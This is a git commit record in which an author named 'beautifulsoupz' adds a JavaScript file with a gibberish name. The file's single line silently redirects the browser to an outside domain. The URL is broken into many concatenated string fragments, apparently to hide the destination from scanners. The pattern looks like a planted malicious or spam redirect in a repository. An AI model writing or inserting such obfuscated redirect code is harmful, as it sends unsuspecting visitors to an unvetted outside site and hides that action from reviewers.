d75ea127181fe5c2305d70f3ab1e3952cb4ca1d3
beautifulsoupz <77855946+crossrevicerszedorton@users.noreply.github.com>
2023-02-05 11:52:13 +0100

    Create jkhjfjkfkjwhfdkwjfgwjhfkwlfehwefkjgwkfgwkfjgwkfjwv.js

---
+++ jkhjfjkfkjwhfdkwjfgwjhfkwlfehwefkjgwkfgwkfjgwkfjwv.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps://www.`,`roads`,`works.`,`com/V0p0l`,`jJEcXB`,`Boh1Z`,`f2-7c_o2-HNu6`,`0ZotOFsh`,`2r0AKrfQ`,`M9l2962BugY`,`spO8HIW-m`,`kHZdlrI`,`aSRJGBW6S`,`nl9og~~/ZACK/kjefbwke`,`jfwbkfjcbwk`,`jbfk`))
